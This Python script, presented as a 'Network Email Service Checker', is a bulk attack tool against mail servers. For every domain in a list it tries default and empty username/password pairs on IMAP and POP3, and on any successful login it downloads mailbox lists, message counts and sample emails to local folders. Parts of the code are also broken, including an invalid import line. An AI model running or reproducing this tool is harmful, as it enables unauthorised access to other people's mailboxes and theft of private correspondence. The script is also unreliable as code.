#!/usr/bin/env python3
"""
Network Email Service Checker
For each domain in a list, attempt to connect to IMAP/POP3 services,
log in with default/no passwords, and retrieve metadata and sample emails.
"""

import os
import sys
import socket
import ssl
import time
from imaplib import IMAP4, IMAP4_SSL, IMAP4.error as IMAPError
from poplib import POP3, POP3_SSL, error_proto as POPError

# ---------- Configuration ----------
DOMAIN_FILE = "domains.txt"           # File with one domain per line
OUTPUT_DIR = "email_backups"          # Base directory for saving data
TIMEOUT = 10                           # Connection timeout in seconds
MAX_MSGS = 10                           # Max number of emails to fetch per mailbox
CREDENTIALS = [
    ("", ""),                           # Empty username/password
    ("admin", ""),
    ("", "admin"),
    ("admin", "admin"),
    ("admin", "password"),
    ("root", ""),
    ("root", "root"),
    ("test", "test"),
    ("user", ""),
    ("user", "user"),
    ("postmaster", ""),
    ("postmaster", "postmaster"),
]

# IMAP: (port, use_ssl, use_starttls)
IMAP_PORTS = [
    (143, False, True),   # Plain with STARTTLS
    (993, True, False),   # SSL
]

# POP3: (port, use_ssl)
POP3_PORTS = [
    (110, False),         # Plain
    (995, True),          # SSL
]

# ---------- Helper Functions ----------
def ensure_dir(path):
    """Create directory if it doesn't exist."""
    if not os.path.exists(path):
        os.makedirs(path)

def save_text(filepath, content):
    """Save text content to a file."""
    with open(filepath, 'w', encoding='utf-8', errors='ignore') as f:
        f.write(content)

def domain_dir(domain):
    """Return the directory path for a domain."""
    return os.path.join(OUTPUT_DIR, domain)

def safe_decode(data):
    """Decode bytes to string, ignoring errors."""
    if isinstance(data, bytes):
        return data.decode('utf-8', errors='ignore')
    return data

# ---------- IMAP Handling ----------
def check_imap(domain, port, use_ssl, use_starttls):
    """
    Attempt IMAP connection on given port.
    If successful, try credentials and fetch metadata/messages.
    Returns True if any credential worked.
    """
    try:
        if use_ssl:
            conn = IMAP4_SSL(domain, port, timeout=TIMEOUT)
        else:
            conn = IMAP4(domain, port, timeout=TIMEOUT)
            if use_starttls:
                conn.starttls()
    except (socket.error, IMAPError, ssl.SSLError) as e:
        return False

    for user, passwd in CREDENTIALS:
        try:
            conn.login(user, passwd)
            print(f"[IMAP] {domain}:{port} - Login successful with {user}/{passwd}")
            # Save metadata
            out_dir = os.path.join(domain_dir(domain), f"imap_{port}")
            ensure_dir(out_dir)

            # Capabilities
            typ, data = conn.capability()
            save_text(os.path.join(out_dir, "capabilities.txt"), safe_decode(data[0]))

            # List mailboxes
            typ, data = conn.list()
            mailboxes = []
            for item in data:
                decoded = safe_decode(item)
                mailboxes.append(decoded)
                # Parse mailbox name (simplified: take last part after delimiter)
                parts = decoded.split(' "/" ')
                if len(parts) > 1:
                    mbox = parts[1].strip('"')
                else:
                    mbox = decoded.split()[-1].strip('"')
                # Fetch messages from INBOX or first mailbox
                if mbox.upper() == "INBOX":
                    inbox = mbox
                else:
                    inbox = None
            save_text(os.path.join(out_dir, "mailboxes.txt"), "\n".join(mailboxes))

            # Select INBOX if exists, else first mailbox
            target_mbox = "INBOX"
            try:
                typ, data = conn.select(target_mbox)
            except IMAPError:
                # INBOX not found, try first mailbox
                if mailboxes:
                    target_mbox = mailboxes[0].split()[-1].strip('"')
                    typ, data = conn.select(target_mbox)
                else:
                    conn.close()
                    conn.logout()
                    return True

            # Get message count
            msg_count = int(data[0])
            save_text(os.path.join(out_dir, f"{target_mbox}_count.txt"), str(msg_count))

            # Fetch some messages
            if msg_count > 0:
                # Fetch first MAX_MSGS messages
                for i in range(1, min(msg_count, MAX_MSGS) + 1):
                    typ, data = conn.fetch(str(i), "(RFC822)")
                    raw_email = data[0][1]
                    save_text(os.path.join(out_dir, f"msg_{i}.eml"), safe_decode(raw_email))
                    time.sleep(0.5)  # be gentle

            conn.close()
            conn.logout()
            return True

        except (IMAPError, socket.error) as e:
            continue  # try next credential

    return False

# ---------- POP3 Handling ----------
def check_pop3(domain, port, use_ssl):
    """
    Attempt POP3 connection on given port.
    If successful, try credentials and fetch metadata/messages.
    Returns True if any credential worked.
    """
    try:
        if use_ssl:
            conn = POP3_SSL(domain, port, timeout=TIMEOUT)
        else:
            conn = POP3(domain, port, timeout=TIMEOUT)
    except (socket.error, POPError, ssl.SSLError) as e:
        return False

    for user, passwd in CREDENTIALS:
        try:
            conn.user(user)
            conn.pass_(passwd)
            print(f"[POP3] {domain}:{port} - Login successful with {user}/{passwd}")
            out_dir = os.path.join(domain_dir(domain), f"pop3_{port}")
            ensure_dir(out_dir)

            # Get mailbox status
            msg_count, total_size = conn.stat()
            save_text(os.path.join(out_dir, "stat.txt"), f"Messages: {msg_count}, Size: {total_size}")

            # List messages (headers only)
            for i in range(1, min(msg_count, MAX_MSGS) + 1):
                # Retrieve headers (first few lines)
                lines = conn.top(i, 0)[1]
                msg_header = "\n".join(safe_decode(l) for l in lines)
                save_text(os.path.join(out_dir, f"msg_{i}_headers.txt"), msg_header)

                # Optionally retrieve full message
                # full_msg = conn.retr(i)[1]
                # save_text(os.path.join(out_dir, f"msg_{i}.eml"), safe_decode(b"\n".join(full_msg)))
                time.sleep(0.5)

            conn.quit()
            return True

        except (POPError, socket.error) as e:
            continue  # try next credential

    return False

# ---------- Main ----------
def main():
    if not os.path.isfile(DOMAIN_FILE):
        print(f"Domain file '{DOMAIN_FILE}' not found.")
        sys.exit(1)

    with open(DOMAIN_FILE, 'r') as f:
        domains = [line.strip() for line in f if line.strip()]

    print(f"Checking {len(domains)} domains...")
    for domain in domains:
        print(f"\n--- Processing {domain} ---")
        ensure_dir(domain_dir(domain))

        # IMAP checks
        for port, use_ssl, use_starttls in IMAP_PORTS:
            print(f"  Trying IMAP port {port}...")
            if check_imap(domain, port, use_ssl, use_starttls):
                print(f"  IMAP port {port} successful.")
            else:
                print(f"  IMAP port {port} failed.")

        # POP3 checks
        for port, use_ssl in POP3_PORTS:
            print(f"  Trying POP3 port {port}...")
            if check_pop3(domain, port, use_ssl):
                print(f"  POP3 port {port} successful.")
            else:
                print(f"  POP3 port {port} failed.")

    print("\nDone. Data saved under", OUTPUT_DIR)

if __name__ == "__main__":
    main()
